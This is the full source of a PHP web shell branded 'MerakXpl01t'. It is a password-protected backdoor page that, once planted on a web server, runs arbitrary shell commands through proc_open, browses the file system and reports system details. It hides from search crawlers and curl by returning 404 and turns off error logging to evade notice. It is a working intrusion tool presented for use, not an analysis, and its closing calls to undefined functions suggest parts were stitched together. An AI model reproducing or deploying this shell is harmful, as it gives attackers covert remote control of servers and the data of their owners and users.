<?php
session_start();
@error_reporting(0);
@set_time_limit(0);

if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}

@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password = "329eadfcb8f4deee2155009da4545105"; # md5: m01t

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE HTML>
<html>
<head>
<title>MerakXpl01t</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: transparent;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
 _____________________________
 | root@merakxpl01t:~# wh0am1 |
 -----------------------------

 															o
                                                            o%
                                                           //
                                                      -="~\
                                                        ~\\\
                                                          \\\
                                                           \\\
                                                            );\
                                                           /|;;\
                                                      """;;;;;;;\
                                                ///"""""""";;;;;;\
                                    ___////+++++""""""""""""";;;@@\
                      __________///////++++++++++++++""""""""@@@@%)
           ....__/0)///0)//0)//0)/++////////++++++++++"""@@@%%%%%/
     ..---0)/--------////////////////+++++++/////+++++@@%%%%%%%/
      ..///---0)---0)///0)//0)///0)/////////+++++====@%%%%%%/
   ...0)....//----///------////////////+++++///"     \/\\//
      //../0)--0)///0)///0)///0)//++++/////          /  \/
      --///--------///////////+++/////             _/   /
.-//..0).-/0)--0)--0)--0)--..                      /\  /
       .......--/////////.                            /\_

	</pre>
</header>
<form method="post">
<input type="password" name="password">
</form>
<?php
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();

?>
<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Thanks Untuk IndoXploit dan Dragon shell sebagai referensi utama shell ini.
// Greetz: All Member MerakXpl01t. & All My Friends.
###############################################################################
-->
<head>
<title>MerakXpl01t</title>
<meta name='author' content='MerakXpl01t'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}

li {
	display: inline;
	margin: 5px;
	padding: 5px;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: gold;
	text-decoration: underline;
}

b {
	color: gold;
}

pre {
	font-size: 13px;
}

table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}

.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}

.th_home {
	color: lime;
}

.td_home, .td_home > a {
	color: #ffffff;
}

.td_home > a:hover {
	color: gold;
}

th {
	padding: 10px;
}

tr:hover {
	background: #006400;
	color: #ffffff;
}

input[type=text], input[type=password], .input {
	background: transparent; 
	color: #ffffff;
	border: 1px solid #ffffff;
	padding: 3px;
	font-family: 'Ubuntu';
	font-size: 13px;
}

input[type=submit] {
	padding: 2px;}

input[type=submit]:hover {
	cursor: pointer;
}

input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}

textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
iframe {
	width: 100%;
	min-height: 500px;
}
</style>
</head>
<body>
<div>

<?php
session_start();
define('PHPSHELL_VERSION', 'MeraXpl01tShell v2.0');

if (ini_get('register_globals') != '1') {
  if (!empty($_POST)) extract($_POST);
  if (!empty($_GET)) extract($_GET);
  if (!empty($_SERVER)) extract($_SERVER);
}

$work_dir = !empty($work_dir) ? $work_dir : getcwd();

if (!empty($command) && preg_match('/^[[:blank:]]*cd[[:blank:]]+([^;]+)$/', $command, $regs)) {
  $new_dir = $regs[1][0] == '/' ? $regs[1] : $work_dir . '/' . $regs[1];
  if (file_exists($new_dir) && is_dir($new_dir)) {
    $work_dir = $new_dir;
    chdir($work_dir);
  }
  unset($command);
} elseif (file_exists($work_dir) && is_dir($work_dir)) {
  chdir($work_dir);
}

$work_dir = getcwd();

$current_user = get_current_user();

$os_info = php_uname('s');
$php_version = phpversion();
$disk_total = disk_total_space("/");
$disk_free = disk_free_space("/");
$disk_used = $disk_total - $disk_free;
$disk_percent = ($disk_used / $disk_total) * 100;
$memory_usage = memory_get_usage();
$memory_peak = memory_get_peak_usage();
$memory_percent = ($memory_usage / $memory_peak) * 100;
$cpu_load = sys_getloadavg();
$cpu_load_avg = $cpu_load[0];
$items = scandir($work_dir);
$directories = array();
$files = array();

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $work_dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($path)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}

$output_content = "merakxpl01t-shell:~$ Welcome to MeraXpl01tShell v2.0\nSystem initialized. Type 'help' for available commands.\n\n";

if (!empty($command)) {
    $output_content .= "merakxpl01t-shell:~$ " . htmlspecialchars($command) . "\n";
    
    if ($command === 'help') {
        $output_content .= "Available commands:\n";
        $output_content .= " help          - Show this help\n";
        $output_content .= " clear         - Clear terminal\n";
        $output_content .= " history       - Show command history\n";
        $output_content .= " date          - Show current date/time\n";
        $output_content .= " whoami        - Show current user\n";
        $output_content .= " pwd           - Show current directory\n";
        $output_content .= " ls            - List directory contents\n";
        $output_content .= " sysinfo       - Show system information\n\n";
    } elseif ($command === 'clear') {
        $output_content = "\n";
    } elseif ($command === 'date') {
        $output_content .= date('Y-m-d H:i:s') . "\n\n";
    } elseif ($command === 'whoami') {
        $output_content .= $current_user . "\n\n";
    } elseif ($command === 'pwd') {
        $output_content .= $work_dir . "\n\n";
    } elseif ($command === 'ls') {
        $output_content .= "Directories:\n";
        foreach ($directories as $dir) {
            $output_content .= "  [DIR]  " . $dir . "\n";
        }
        $output_content .= "\nFiles:\n";
        foreach ($files as $file) {
            $output_content .= "  [FILE] " . $file . "\n";
        }
        $output_content .= "\n";
    } elseif ($command === 'sysinfo') {
        $output_content .= "System Information:\n";
        $output_content .= "  OS: " . $os_info . "\n";
        $output_content .= "  PHP Version: " . $php_version . "\n";
        $output_content .= "  Current User: " . $current_user . "\n";
        $output_content .= "  Current Directory: " . $work_dir . "\n\n";
    } else {
        $descriptorspec = array(
           0 => array("pipe", "r"),
           1 => array("pipe", "w"),
           2 => array("pipe", "w")
        );
        
        $process = proc_open($command, $descriptorspec, $pipes, $work_dir);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            
            $cmd_output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $return_value = proc_close($process);
            
            if (!empty($cmd_output)) {
                $output_content .= htmlspecialchars($cmd_output);
            }
            
            if (!empty($errors)) {
                $output_content .= "ERROR:\n" . htmlspecialchars($errors);
            }
        } else {
            $output_content .= "Failed to execute command\n";
        }
        $output_content .= "\n";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MeraXpl01t-Shell</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #8a2be2;
            --secondary: #00ffff;
            --dark: #0a0a0a;
            --darker: #050505;
            --light: #f0f0f0;
            --gray: #2d2d2d;
            --success: #00c853;
            --danger: #ff1744;
            --warning: #ff9800;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--darker), var(--dark));
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            background-attachment: fixed;
        }
        
        body::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 10% 20%, rgba(138, 43, 226, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(0, 255, 255, 0.1) 0%, transparent 20%);
            z-index: -1;
        }
        
        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            opacity: 0.1;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 20px 0;
            margin-bottom: 20px;
            position: relative;
        }
        
        .logo {
            font-size: 3.5rem;
            font-weight: 800;
            background: linear-gradient(to right, var(--secondary), var(--primary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 15px rgba(138, 43, 226, 0.5);
            margin-bottom: 10px;
            letter-spacing: 3px;
            position: relative;
            display: inline-block;
        }
        
        .logo::after {
            content: "_";
            animation: blink 1s infinite;
            position: absolute;
            right: -20px;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .subtitle {
            color: var(--secondary);
            font-size: 1.3rem;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .grid-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        @media (max-width: 992px) {
            .grid-container {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(20, 20, 20, 0.8);
            border-radius: 10px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(138, 43, 226, 0.3);
            backdrop-filter: blur(10px);
            height: fit-content;
        }
        
        .card-full {
            grid-column: 1 / -1;
        }
        
        .card-title {
            color: var(--secondary);
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 1.5rem;
        }
        
        .card-title i {
            font-size: 1.5rem;
        }
        
        .path-container {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .current-path {
            background: var(--gray);
            padding: 12px 15px;
            border-radius: 5px;
            flex-grow: 1;
            min-width: 300px;
            border: 1px solid rgba(138, 43, 226, 0.3);
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 5px;
            margin-top: 10px;
        }
        
        .breadcrumb a {
            color: var(--secondary);
            text-decoration: none;
            padding: 5px 10px;
            border-radius: 3px;
            transition: all 0.3s;
            font-size: 0.9rem;
        }
        
        .breadcrumb a:hover {
            background: rgba(138, 43, 226, 0.3);
        }
        
        .directory-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .directory-item {
            background: rgba(45, 45, 45, 0.7);
            border-radius: 8px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        
        .directory-item:hover {
            transform: translateY(-5px);
            border-color: var(--secondary);
            box-shadow: 0 5px 15px rgba(0, 255, 255, 0.2);
        }
        
        .directory-item.folder {
            color: var(--secondary);
        }
        
        .directory-item.file {
            color: var(--warning);
        }
        
        .directory-item i {
            font-size: 2rem;
            margin-bottom: 10px;
            display: block;
        }
        
        .directory-item .name {
            font-size: 0.9rem;
            word-break: break-all;
        }
        
        .directory-select {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        
        select, input, button {
            padding: 12px 15px;
            border-radius: 5px;
            border: none;
            background: var(--gray);
            color: var(--light);
            font-size: 1rem;
            outline: none;
        }
        
        select {
            flex-grow: 1;
            min-width: 300px;
            border: 1px solid rgba(138, 43, 226, 0.3);
        }
        
        input[type="text"] {
            flex-grow: 1;
            min-width: 300px;
            border: 1px solid rgba(0, 255, 255, 0.3);
        }
        
        button {
            background: linear-gradient(to right, var(--primary), #5d1a9b);
            color: white;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            border: 1px solid rgba(138, 43, 226, 0.5);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(138, 43, 226, 0.4);
        }
        
        .command-section {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        
        .output-container {
            position: relative;
            margin-top: 20px;
        }
        
        textarea {
            width: 100%;
            min-height: 300px;
            background: var(--darker);
            color: var(--success);
            padding: 20px;
            border-radius: 5px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            font-family: 'Courier New', monospace;
            font-size: 1rem;
            resize: vertical;
            white-space: pre;
            overflow-wrap: normal;
            overflow-x: auto;
        }
        
        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .controls {
            display: flex;
            gap: 10px;
        }
        
        .btn-small {
            padding: 5px 10px;
            font-size: 0.9rem;
        }
        
        footer {
            text-align: center;
            padding: 20px;
            color: #666;
            font-size: 0.9rem;
            margin-top: 20px;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.7; }
            50% { opacity: 1; }
            100% { opacity: 0.7; }
        }
        
        .glow {
            text-shadow: 0 0 10px var(--secondary), 0 0 20px var(--primary);
        }
        
        .scanline {
            position: relative;
            overflow: hidden;
        }
        
        .scanline::before {
            content: "";
            position: absolute;
            width: 100%;
            height: 2px;
            background: rgba(0, 255, 255, 0.3);
            top: 0;
            left: 0;
            animation: scan 5s linear infinite;
        }
        
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
        
        .status-bar {
            display: flex;
            justify-content: space-between;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 15px;
            border-radius: 5px;
            margin-top: 15px;
            font-size: 0.9rem;
            border: 1px solid rgba(0, 255, 255, 0.2);
        }
        
        .connection-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--success);
        }
        
        .system-info {
            display: flex;
            gap: 20px;
        }
        
        .info-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        @media (max-width: 768px) {
            .path-container, .directory-select, .command-section {
                flex-direction: column;
            }
            
            select, input, button {
                width: 100%;
            }
            
            .logo {
                font-size: 2.5rem;
            }
            
            .grid-container {
                gap: 15px;
            }
            
            .card {
                padding: 15px;
            }
            
            .status-bar {
                flex-direction: column;
                gap: 10px;
            }
        }
        
        .floating {
            animation: floating 3s ease-in-out infinite;
        }
        
        @keyframes floating {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
        
        .hacker-text {
            position: relative;
            overflow: hidden;
        }
        
        .hacker-text::after {
            content: "|";
            animation: blink 1s infinite;
            margin-left: 5px;
        }
        
        .progress-container {
            margin-top: 15px;
        }
        
        .progress-bar {
            height: 10px;
            background: #333;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 5px;
        }
        
        .progress-fill {
            height: 100%;
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrixCanvas"></canvas>
    
    <div class="container">
        <header>
            <div class="logo pulse glow floating">MerakXpl01t</div>
            <div class="subtitle hacker-text"><?php echo PHPSHELL_VERSION; ?> | ADVANCED TERMINAL INTERFACE</div>
        </header>
        
        <div class="grid-container">
            <div class="card">
                <h2 class="card-title"><i class="fas fa-folder-open"></i> File Explorer</h2>
                
                <div class="path-container">
                    <strong>Current Path:</strong>
                    <div class="current-path"><?php echo htmlspecialchars($work_dir); ?></div>
                </div>
                
                <div class="path-container">
                    <strong>Breadcrumb Navigation:</strong>
                    <div class="breadcrumb">
                        <?php
                        $path_parts = explode('/', trim($work_dir, '/'));
                        $path_accum = '';
                        
                        echo '<a href="#" onclick="changeDir(\'/\')">Root</a>';
                        
                        foreach ($path_parts as $part) {
                            if ($part === '') continue;
                            $path_accum .= '/' . $part;
                            echo '<span>/</span><a href="#" onclick="changeDir(\'' . htmlspecialchars($path_accum) . '\')">' . htmlspecialchars($part) . '</a>';
                        }
                        ?>
                    </div>
                </div>
                
                <div class="directory-select">
                    <select id="dirSelect">
                        <?php
                        $dirs = array_filter(glob('*'), 'is_dir');
                        array_unshift($dirs, '.');
                        
                        if ($work_dir !== '/') {
                            array_unshift($dirs, '..');
                        }
                        
                        foreach ($dirs as $dir) {
                            $selected = ($dir === '.') ? 'selected' : '';
                            $dir_path = ($dir === '.') ? $work_dir : (($dir === '..') ? dirname($work_dir) : $work_dir . '/' . $dir);
                            echo "<option value=\"" . htmlspecialchars($dir_path) . "\" $selected>" . htmlspecialchars($dir) . "</option>";
                        }
                        ?>
                    </select>
                    <button onclick="handleDirChange()"><i class="fas fa-sync-alt"></i> Refresh</button>
                </div>
                
                <div class="directory-grid" id="directoryGrid">
                    <?php foreach ($directories as $dir): ?>
                    <div class="directory-item folder" onclick="changeDir('<?php echo htmlspecialchars($work_dir . DIRECTORY_SEPARATOR . $dir); ?>')">
                        <i class="fas fa-folder"></i>
                        <div class="name"><?php echo htmlspecialchars($dir); ?></div>
                    </div>
                    <?php endforeach; ?>
                    
                    <?php foreach ($files as $file): ?>
                    <div class="directory-item file">
                        <i class="fas fa-file"></i>
                        <div class="name"><?php echo htmlspecialchars($file); ?></div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>
            
            <div class="card">
                <h2 class="card-title"><i class="fas fa-terminal"></i> Command Line</h2>
                
                <form id="commandForm" method="get">
                    <input type="hidden" name="work_dir" id="workDirInput" value="<?php echo htmlspecialchars($work_dir); ?>">
                    
                    <div class="command-section">
                        <input type="text" id="commandInput" name="command" placeholder="Enter shell command..." autocomplete="off">
                        <button type="submit"><i class="fas fa-bolt"></i> Execute</button>
                    </div>
                </form>
                
                <div class="output-container scanline">
                    <div class="terminal-header">
                        <h3>Terminal Output</h3>
                        <div class="controls">
                            <button class="btn-small" onclick="clearOutput()"><i class="fas fa-trash-alt"></i> Clear</button>
                            <button class="btn-small" onclick="downloadOutput()"><i class="fas fa-download"></i> Save</button>
                        </div>
                    </div>
                    <textarea id="output" readonly><?php echo $output_content; ?></textarea>
                </div>
                
                <div class="status-bar">
                    <div class="connection-indicator">
                        <div class="indicator"></div>
                        <span>Connected to <?php 
                        $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
                        echo htmlspecialchars($host);
                        ?></span>
                    </div>
                    <div class="system-info">
                        <div class="info-item">
                            <i class="fas fa-microchip"></i>
                            <span>PHP <?php echo $php_version; ?></span>
                        </div>
                        <div class="info-item">
                            <i class="fas fa-server"></i>
                            <span><?php echo $os_info; ?></span>
                        </div>
                        <div class="info-item">
                            <i class="fas fa-clock"></i>
                            <span id="clock"></span>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="card card-full">
                <h2 class="card-title"><i class="fas fa-chart-network"></i> System Overview</h2>
                
                <div class="grid-container" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));">
                    <div class="card" style="background: rgba(40, 40, 60, 0.6);">
                        <h3><i class="fas fa-memory"></i> Memory Usage</h3>
                        <div class="progress-container">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                                <span>RAM: <?php echo round($memory_usage/1024/1024, 2); ?> MB</span>
                                <span><?php echo round($memory_peak/1024/1024, 2); ?> MB peak</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: <?php echo min(100, $memory_percent); ?>%; background: linear-gradient(to right, var(--primary), var(--secondary));"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card" style="background: rgba(40, 60, 40, 0.6);">
                        <h3><i class="fas fa-hard-drive"></i> Disk Space</h3>
                        <div class="progress-container">
                            <div style="display: flex; justify-content: space-between; margin-bottom: 5px;">
                                <span>Used: <?php echo round($disk_used/1024/1024/1024, 2); ?> GB</span>
                                <span>Total: <?php echo round($disk_total/1024/1024/1024, 2); ?> GB</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: <?php echo $disk_percent; ?>%; background: linear-gradient(to right, var(--warning), #ff5722);"></div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card" style="background: rgba(60, 40, 40, 0.6);">
                        <h3><i class="fas fa-microchip"></i> CPU Load</h3>
                        <div style="margin-top: 15px; text-align: center;">
                            <div style="font-size: 2.5rem; color: var(--secondary);"><?php echo $cpu_load_avg; ?></div>
                            <div style="margin-top: 10px;">
                                <span class="info-item"><i class="fas fa-microchip"></i> Current Load</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <footer>
            <p>MeraXpl01tShell v2.0</p>
            <p>Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.</p>
            <p>Special thanks Untuk IndoXploit dan Dragon shell sebagai referensi utama shell ini.</p>
            <p>Greetz: All Member MerakXpl01t. & All My Friends.</p>
        </footer>
    </div>
    
    <script>
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        
        const drops = [];
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.floor(Math.random() * canvas.height / fontSize);
        }
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#0F0';
            ctx.font = fontSize + 'px monospace';
            
            for(let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 33);
        
        function updateClock() {
            const now = new Date();
            const timeString = now.toLocaleTimeString();
            document.getElementById('clock').textContent = timeString;
        }
        
        setInterval(updateClock, 1000);
        updateClock();
        
        window.addEventListener('resize', function() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        document.getElementById('commandInput').addEventListener('keydown', function(e) {
            if(e.key === 'Enter') {
                document.getElementById('commandForm').submit();
            }
        });
        
        function changeDir(path) {
            document.getElementById('workDirInput').value = path;
            document.getElementById('commandForm').submit();
        }
        
        function handleDirChange() {
            const select = document.getElementById('dirSelect');
            const path = select.options[select.selectedIndex].value;
            changeDir(path);
        }
        
        function clearOutput() {
            document.getElementById('output').value = '';
        }
        
        function downloadOutput() {
            const output = document.getElementById('output').value;
            const blob = new Blob([output], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = 'merakxpl01tshell_output.txt';
            document.body.appendChild(a);
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            }, 100);
        }
        
        function scrollToBottom() {
            const textarea = document.getElementById('output');
            textarea.scrollTop = textarea.scrollHeight;
        }
        
        scrollToBottom();
    </script>
</body>
</html>


</div>
<?php
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}
serverinfo();
action();
?>

</body>
</html>
